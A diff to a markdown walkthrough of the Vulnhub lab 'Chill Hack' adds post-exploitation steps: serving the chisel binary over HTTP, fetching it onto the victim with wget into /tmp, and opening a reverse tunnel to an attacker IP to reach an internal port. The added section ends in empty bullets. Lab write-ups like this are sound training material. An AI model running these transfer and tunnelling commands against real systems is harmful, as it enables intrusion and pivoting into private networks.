@@ -1,4 +1,4 @@
-* * *
+![image](https://github.com/user-attachments/assets/87a7f2c8-cb4b-43fd-b2fd-e1ddf1e2b89f)* * *
 Title: Chill Hack
 Platform: Vulnhub
 
@@ -143,7 +143,33 @@ a customer page.
   ![image](https://github.com/user-attachments/assets/55c1d7c2-ca3c-44cb-b2fc-dead8e43a4b4)
 
 - We can make it available on our machine by port forwarding it with chisel, but our first task  is to send the chisel binary from
-our attacker machine.
+our attacker machine.Set up a python http server with this command `python -m http.server 8000` in the director chisel is located.
+
+ ![image](https://github.com/user-attachments/assets/cbd6da90-440f-49eb-9869-aec6ec00d198)
+
+- Receive with `wget http://[host'sip]:[http server'sport]/[binary's name]`, it should be noted that we can only write files to directories like `/dev/shm` and `/tmp` in the victim's machine. I'll be writing to /tmp.The next step is to grant the binary with
+`chmod +x {binary}` to grant execute permissions.
+
+  ![image](https://github.com/user-attachments/assets/0871e405-846a-43e1-8373-d5837863995a)--
+
+-  Set up a server with `chisel server -p [port] --reverse` on your target machine
+
+  ![image](https://github.com/user-attachments/assets/1d197c0f-d4de-40b5-9ffe-368cb5663647)
+
+- We have to set up a client on the victim's machine with `./chisel client [attacker'sip]:[chisel's server port] R:[port that you want to tunnel through]:[localhost]:[port running the service internally]`.After executing, the client should communicate with our server.
+
+   `./chisel client 192.168.184.129:8002 R:8003:127.0.0.1:9001`
+   
+  ![image](https://github.com/user-attachments/assets/3eb0eb80-1e18-48f0-83dd-1a18405191cd)
+
+- 
+  
+
+  
+
+
+  
+ 
 
 
 
